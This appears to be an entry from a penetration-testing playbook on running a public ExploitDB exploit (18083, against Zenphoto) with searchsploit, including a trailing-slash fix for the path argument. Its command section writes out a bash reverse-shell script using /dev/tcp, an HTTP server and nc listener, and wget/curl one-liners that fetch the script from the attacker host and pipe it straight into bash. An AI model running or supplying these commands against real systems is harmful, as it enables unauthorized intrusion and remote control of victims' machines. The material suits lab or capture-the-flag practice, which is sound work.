title: Run a Public Exploit — searchsploit, Args, Path Gotchas
body:
You have 'CMS X version Y' and a matching ExploitDB entry. This is the mechanics of actually RUNNING it without burning 20 minutes on argument and path mistakes.

COPY, don't run-in-place: 'searchsploit -m <id>' copies the exploit into your cwd so you can read and edit it. ALWAYS read the usage header first — run it with no args and it prints how it wants to be called (host + path, host + port, etc).

THE PATH/SLASH GOTCHA: web exploits take the app's base path, and a trailing slash often matters. 'php 18083.php $ip /test' may fail where 'php 18083.php $ip /test/' works — the exploit concatenates the path and a missing slash breaks the target URL. If the exploit 'connects' but every command returns 'failed', try toggling the trailing slash before assuming the exploit is broken.

THE FLAKY-CHANNEL PROBLEM: an exploit's built-in shell (e.g. 'zenphoto-shell#') is often a fragile single request-per-command channel — intermittent, no TTY, dies on complex payloads. The moment it works at all, use it to pull a REAL shell: host a script and pipe it to bash (see hosted_shell). Don't fight the exploit's shell; bootstrap out of it.
cmd:
# ════════════════════════════════════════════════════════
# 1. Find + COPY the exploit (read before running)
# ════════════════════════════════════════════════════════
searchsploit zenphoto                       # match your exact version
searchsploit -m 18083                        # -m copies it to ./ to read/edit
php 18083.php                                # no args -> prints the usage header

# ════════════════════════════════════════════════════════
# 2. Run with the right args — mind the trailing slash
# ════════════════════════════════════════════════════════
php 18083.php $ip /test/                      # NOTE: /test/ (with slash) — /test may fail
#   if it 'connects' but whoami returns failed -> toggle the trailing slash and retry

# ════════════════════════════════════════════════════════
# 3. Bootstrap out of the flaky exploit shell into a real one
# ════════════════════════════════════════════════════════
# Kali: host the script + start a listener (different ports is fine)
cat > shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/$lhost/$lport 0>&1
EOF
python3 -m http.server 8090                  # one terminal
nc -nlvp $lport                              # another terminal

# in the exploit shell — fetch + pipe to bash (no temp file needed):
wget -qO- http://$lhost:8090/shell.sh | bash
# alt if wget is odd:  curl -s http://$lhost:8090/shell.sh | bash
warn: Read the exploit source before running — public PoCs can be sabotaged or destructive (see the evaluate-public-exploits node). For the path arg: when in doubt, try WITH and WITHOUT the trailing slash — it's the single most common reason a working exploit 'fails'. And don't waste time stabilising the exploit's own shell; the first successful command should fetch a proper reverse shell.

choices.label: Read it first — is this PoC safe?
Exploit shell is flaky — stage a real shell
Exploit needs C/source fixes to compile
